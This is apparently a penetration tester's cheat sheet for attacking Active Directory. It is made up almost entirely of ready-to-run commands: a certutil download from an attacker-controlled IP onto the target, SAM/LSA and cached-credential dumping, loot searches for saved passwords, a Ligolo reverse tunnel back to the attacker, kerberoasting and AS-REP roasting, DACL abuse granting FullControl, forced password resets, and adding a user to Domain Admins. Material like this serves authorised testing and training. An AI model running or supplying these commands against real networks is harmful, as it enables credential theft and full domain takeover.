# Active Directory Enumeration & Exploitation

## Local Post-Exploitation

### Initialize env vars
```bash
export localadmin=<LOCALADMIN>
export localadminpwd=<LOCALADMINPASSWORD>
```

### Complete machine loot finding
```bash
certutil.exe -urlcache -split -f "http://<YOUR_IP>/filename.ext" "C:\Windows\Temp\filename.ext"

Seatbelt.exe PowerShellHistory SavedRdpConnections CloudCredentials FileZilla KeePass
winPEASany.exe filesinfo > C:\Windows\Temp\files_loot.txt

%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\
```

### Dump cached pwds and logonpwds
```bash
python3 secretsdump.py "$localadmin:$localadminpwd@MS01"
nxc smb MS01 -u $localadmin -p "$localadminpwd" --sam --lsa --local-auth
```

### Ligolo tunnel
```bash
Upload agent to target
Initialize proxy locally
1. sudo ip tuntap add user ratty mode tun ligolo
2. sudo ip link set ligolo up
3. ./proxy -selfcert
4. .\agent -connect <myip>:11601 -ignore-cert
(In ligolo interface) session >> 1
// Check if internal network route is added $ ifconfig
$ start
(on debian) sudo ip route add <internalsubnet>/24 dev ligolo
```
## Intial Domain Enum

### Initialize env vars
```bash
export dcip=<DCIP>
export domain=<DOMAIN>
export domainuser=<DOMAINUSER>
export domainuserpwd=<DOMAINUSERPASSWORD>
```

### Get all users and groups
```bash
nxc ldap $dcip -d $domain -u $domainuser -p $domainuserpwd --groups | grep "membercount:" | awk -F'  +' '{print $5}' > groups
nxc ldap $dcip -d $domain -u $domainuser -p $domainuserpwd --user-export users
```
### Spray kerberoasting and asreproasting.
```bash
nxc ldap $dcip -d $domain -u $domainuser -p "$domainuserpwd" --kerberoasting nxckerb
python3 GetUserSPNs.py "$domain/$domainuser:$domainuserpwd" -dc-ip $dcip -request -outputfile impkerb

nxc ldap $dcip -d $domain -u $domainuser -p "$domainuserpwd" --asreproast nxcasrep
python GetNPUsers.py "$domain/$domainuser:$domainuserpwd" -dc-ip $dcip -request -outputfile impasrep
```

### Bloodhound
```bash
cd ~/bloodhound
./bloodhound-cli up
./bloodhound-cli resetpwd
```

## Targeted enum

### Get pwned user outbound object control
```bash
bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" get writable --otype USER --detail
```
### Get juicy user inbound object control
```bash
python3 dacledit.py "$domain/$domainuser:$domainuserpwd" -dc-ip $dcip -action read -target "john.doe"
```

### Enum group membership
```bash
bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" get membership john.doe
```

### Get object details
```bash
bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" get object "Domain Admins"
```
## AD Exploitation

### Give user GenericAll over on object
```bash
python3 dacledit.py "$domain/$domainuser:$domainuserpwd" -dc-ip $dcip -action write -rights FullControl -principal $domainuser -target "target_object"
bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" add genericAll "target_object" $domainuser
```
### Forcing user to change password
```
bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" set password "target_user" "Academy_P@ssw0rd123!"
```

### Add user to group
```bash
bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" add groupMember "Domain Admins" "john.doe"
python3 net.py "$domain/$domainuser:$domainuserpwd@$dcip" group -name "Domain Admins" -add "john.doe"
```
### Enable a user account
```bash
bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" set uac "target_user" 512
```
